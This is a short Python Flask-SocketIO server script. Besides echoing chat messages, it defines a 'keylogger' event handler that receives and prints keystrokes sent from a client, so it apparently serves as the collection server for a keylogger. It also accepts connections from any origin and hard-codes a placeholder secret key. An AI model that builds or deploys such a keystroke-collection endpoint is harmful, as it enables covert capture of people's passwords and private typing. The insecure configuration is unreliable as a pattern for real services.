from flask import Flask, render_template
from flask_socketio import SocketIO, emit, send
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/", methods=['GET', 'POST'])
def home():
    return render_template('index.html')

@socketio.on('message')
def message(data):
    print(data)
    send(data)

@socketio.on('keylogger')
def test_connect(data):
    print(data["keylogged"])
    send(data)


print(int(os.environ.get('PORT', 5000)))

if __name__ == '__main__':
    print("beforeRun:", str(int(os.environ.get('PORT', 5000))))
    app.run(port=int(os.environ.get('PORT', 5000)))